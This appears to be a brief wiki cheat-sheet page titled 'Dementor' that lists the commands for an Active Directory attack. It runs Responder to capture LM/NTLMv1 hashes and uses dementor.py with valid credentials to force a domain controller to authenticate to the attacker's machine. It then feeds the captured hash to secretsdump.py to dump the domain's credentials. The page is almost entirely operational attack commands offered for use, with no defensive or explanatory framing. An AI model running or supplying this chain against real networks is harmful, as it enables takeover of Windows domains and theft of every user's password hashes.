<!-- TITLE: Dementor -->
<!-- SUBTITLE: A quick summary of Dementor -->

# How to call
```
Responder.py -I eth0 --lm

python dementor.py -d domain.fqdn -u userid -p 'password' ip_of_responder_computer DOMAIN_CONTROLLER_COMPNAME

responder gets connection with ntlmv1 hash.

python secretsdump.py 'shortdomainname/DOMAIN_CONTROLLER_COMPNAME@DOMAIN_CONTROLLER_COMPNAME' -hashes 'capturedhash_from_responder'
```